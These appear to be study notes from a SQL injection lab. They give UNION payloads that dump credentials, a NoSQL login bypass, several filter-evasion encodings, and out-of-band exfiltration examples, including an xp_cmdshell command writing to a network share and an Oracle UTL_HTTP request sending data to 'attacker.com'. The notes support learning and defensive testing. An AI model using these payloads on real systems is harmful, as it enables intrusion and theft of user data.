0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'

0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'

0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users



NoSQL

user[$ne]=xxxx&pass[$ne]=yyyy


URL Encoding: URL encoding is a common method where characters are represented using a percent (%) sign followed by their ASCII value in hexadecimal. For example, the payload ' OR 1=1-- can be encoded as %27%20OR%201%3D1--. This encoding can help the input pass through web application filters and be decoded by the database, which might not recognise it as malicious during initial processing.
Hexadecimal Encoding: Hexadecimal encoding is another effective technique for constructing SQL queries using hexadecimal values. For instance, the query SELECT * FROM users WHERE name = 'admin' can be encoded as SELECT * FROM users WHERE name = 0x61646d696e. By representing characters as hexadecimal numbers, the attacker can bypass filters that do not decode these values before processing the input.
Unicode Encoding: Unicode encoding represents characters using Unicode escape sequences. For example, the string admin can be encoded as \u0061\u0064\u006d\u0069\u006e. This method can bypass filters that only check for specific ASCII characters, as the database will correctly process the encoded input.

%27 is the URL encoding for the single quote (').
%20 is the URL encoding for a space ( ).
|| represents the SQL OR operator.
%3D is the URL encoding for the equals sign (=).
%2D%2D is the URL encoding for --, which starts a comment in SQL.


No-Quote SQL Injection

No-Quote SQL injection techniques are used when the application filters single or double quotes or escapes.

    Using Numerical Values: One approach is to use numerical values or other data types that do not require quotes. For example, instead of injecting ' OR '1'='1, an attacker can use OR 1=1 in a context where quotes are not necessary. This technique can bypass filters that specifically look for an escape or strip out quotes, allowing the injection to proceed.
    Using SQL Comments: Another method involves using SQL comments to terminate the rest of the query. For instance, the input admin'-- can be transformed into admin--, where the -- signifies the start of a comment in SQL, effectively ignoring the remainder of the SQL statement. This can help bypass filters and prevent syntax errors.
    Using CONCAT() Function: Attackers can use SQL functions like CONCAT() to construct strings without quotes. For example, CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e) constructs the string admin. The CONCAT() function and similar methods allow attackers to build strings without directly using quotes, making it harder for filters to detect and block the payload.

No Spaces Allowed

When spaces are not allowed or are filtered out, various techniques can be used to bypass this restriction.

    Comments to Replace Spaces: One common method is to use SQL comments (/**/) to replace spaces. For example, instead of SELECT * FROM users WHERE name = 'admin', an attacker can use SELECT/**//*FROM/**/users/**/WHERE/**/name/**/='admin'. SQL comments can replace spaces in the query, allowing the payload to bypass filters that remove or block spaces.
    Tab or Newline Characters: Another approach is using tab (\t) or newline (\n) characters as substitutes for spaces. Some filters might allow these characters, enabling the attacker to construct a query like SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'. This technique can bypass filters that specifically look for spaces.
    Alternate Characters: One effective method is using alternative URL-encoded characters representing different types of whitespace, such as %09 (horizontal tab), %0A (line feed), %0C (form feed), %0D (carriage return), and %A0 (non-breaking space). These characters can replace spaces in the payload. 

    The SQL query shows that the spaces are being omitted by code. To bypass these protections, we can use URL-encoded characters that represent different types of whitespace or line breaks, such as %09 (horizontal tab), %0A (line feed). These characters can replace spaces and still be interpreted correctly by the SQL parser.

The original payload 1' OR 1=1 -- can be modified to use newline characters instead of spaces, resulting in the payload 1'%0A||%0A1=1%0A--%27+. This payload constructs the same logical condition as 1' OR 1=1 -- but uses newline characters to bypass the space filter.

Techniques in Different Databases

Out-of-band SQL injection attacks utilise the methodology of writing to another communication channel through a crafted query. This technique is effective for exfiltrating data or performing malicious actions when direct interaction with the database is restricted. There are multiple commands within a database that may allow exfiltration, but below is a list of the most commonly used in various database systems:

MySQL and MariaDB

In MySQL or MariaDB, Out-of-band SQL injection can be achieved using SELECT ... INTO OUTFILE or load_file command. This command allows an attacker to write the results of a query to a file on the server's filesystem. For example:

 
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';

        

An attacker could then access this file via an SMB share or HTTP server running on the database server, thereby exfiltrating the data through an alternate channel.

Microsoft SQL Server (MSSQL)

In MSSQL, Out-of-band SQL injection can be performed using features like xp_cmdshell, which allows the execution of shell commands directly from SQL queries. This can be leveraged to write data to a file accessible via a network share:

 
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';

        

Alternatively, OPENROWSET or BULK INSERT can be used to interact with external data sources, facilitating data exfiltration through OOB channels.

Oracle

In Oracle databases, Out-of-band SQL injection can be executed using the UTL_HTTP or UTL_FILE packages. For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:

 
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;

        


SQLMap: SQLMap is an open-source tool that automates the process of detecting and exploiting SQL Injection vulnerabilities in web applications. It supports a wide range of databases and provides extensive options for both identification and exploitation. You can learn more about the tool here.
SQLNinja: SQLNinja is a tool specifically designed to exploit SQL Injection vulnerabilities in web applications that use Microsoft SQL Server as the backend database. It automates various stages of exploitation, including database fingerprinting and data extraction. 
JSQL Injection: A Java library focused on detecting SQL injection vulnerabilities within Java applications. It supports various types of SQL Injection attacks and provides a range of options for extracting data and taking control of the database.
BBQSQL: BBQSQL is a Blind SQL Injection exploitation framework designed to be simple and highly effective for automated exploitation of Blind SQL Injection vulnerabilities.